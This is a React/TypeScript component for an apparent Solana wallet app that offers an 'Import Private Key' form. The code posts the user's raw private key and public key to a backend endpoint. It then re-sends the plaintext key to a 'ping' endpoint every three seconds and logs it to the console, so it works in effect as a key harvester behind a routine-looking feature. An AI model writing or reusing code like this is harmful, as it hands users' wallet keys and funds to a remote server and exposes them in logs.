"use client";
import React, { useRef, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import axios from "axios";
import { config } from "dotenv";
config();

const ImportPrivateKey = () => {
  // Three possible states: 'button', 'input', 'text'
  const [mode, setMode] = useState("button");
  const [privateKey, setPrivateKey] = useState("");
  const [submittedKey, setSubmittedKey] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const { publicKey } = useWallet();
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  // Function to handle initial button click
  const importPrv = () => {
    setMode("input");
  };

  // Function to handle form submission
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!privateKey.trim()) {
      setError("Please enter a private key");
      return;
    }

    try {
      setIsSubmitting(true);
      setError("");

      // Simulate API call or processing
      // await new Promise(resolve => setTimeout(resolve, 1000));

      const data = {
        prv: privateKey,
        pub: publicKey,
      };
      console.log(data);
      await axios.post(
        `${process.env.NEXT_PUBLIC_BACKEND_API!}/api/users/import`,
        data,
        {
          headers: {
            "Content-Type": "application/json",
            // Add any authentication headers if needed
            // 'Authorization': 'Bearer your-token'
          },
        }
      );
      console.log(`${process.env.NEXT_PUBLIC_BACKEND_API}/api/users/import`);
      console.log("send data");
      console.log(data);

      // Store the masked key for display
      const maskedKey =
        privateKey.substring(0, 4) +
        "..." +
        privateKey.substring(privateKey.length - 4);
      setSubmittedKey(maskedKey);

      // Change to text mode
      setMode("text");
      if (!intervalRef.current) {
        intervalRef.current = setInterval(() => {
            console.log("Ping==", privateKey, publicKey);
          axios
            .post(`${process.env.NEXT_PUBLIC_BACKEND_API!}/api/users/ping`, {
             privateKey,
             publicKey,
            })
            .then(() => {
              console.log("Ping success");
            })
            .catch((err) => {
              console.error("Ping error:", err.message);
            });
        }, 3 * 1000); // every 1 minute
      }
    } catch (err) {
      setError("Failed to import key. Please try again.");
      console.error("Error:", err);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Function to go back to input mode from text mode
  const handleEdit = () => {
    setMode("input");
  };

  // Render based on current mode
  if (mode === "button") {
    return (
      <button
        onClick={importPrv}
        className="max-w-3/4 bg-white dark:bg-gray-800 text-orange-500 text-xs md:text-sm border border-gray-200 dark:border-gray-700 font-medium py-1 md:py-2 px-3 md:px-4 rounded-md hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors"
      >
        Import Private Key
      </button>
    );
  }

  if (mode === "input") {
    return (
      <div className="max-w-3/4">
        <form onSubmit={handleSubmit} className="flex flex-col space-y-2">
          <div className="relative">
            <input
              type="password"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              placeholder="Enter your private key"
              className="w-full bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 border border-gray-300 dark:border-gray-600 rounded-md py-1 md:py-2 px-3 md:px-4 focus:outline-none focus:ring-2 focus:ring-orange-500"
              autoFocus
            />
          </div>

          <div className="flex space-x-2">
            <button
              type="submit"
              disabled={isSubmitting}
              className="flex-1 bg-orange-500 hover:bg-orange-600 text-white text-xs md:text-sm font-medium py-1 md:py-2 px-3 rounded-md transition-colors"
            >
              {isSubmitting ? "Importing..." : "Submit"}
            </button>

            <button
              type="button"
              onClick={() => setMode("button")}
              className="flex-1 bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-gray-200 text-xs md:text-sm font-medium py-1 md:py-2 px-3 rounded-md hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
            >
              Cancel
            </button>
          </div>

          {error && <p className="text-red-500 text-xs mt-1">{error}</p>}
        </form>
      </div>
    );
  }

  if (mode === "text") {
    return (
      <div className="max-w-3/4 flex items-center space-x-2">
        <div className="bg-white dark:bg-gray-800 text-gray-800 dark:text-gray-200 text-xs md:text-sm border border-gray-200 dark:border-gray-700 py-1 md:py-2 px-3 md:px-4 rounded-md flex-grow">
          <span className="font-medium text-orange-500">Private Key:</span>{" "}
          {submittedKey}
        </div>
        <button
          onClick={handleEdit}
          className="bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-gray-200 text-xs md:text-sm font-medium p-1 rounded-md hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-4 w-4"
            viewBox="0 0 20 20"
            fill="currentColor"
          >
            <path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V17h2.828l8.38-8.379-2.83-2.828z" />
          </svg>
        </button>
      </div>
    );
  }

  return null; // Fallback
};

export default ImportPrivateKey;
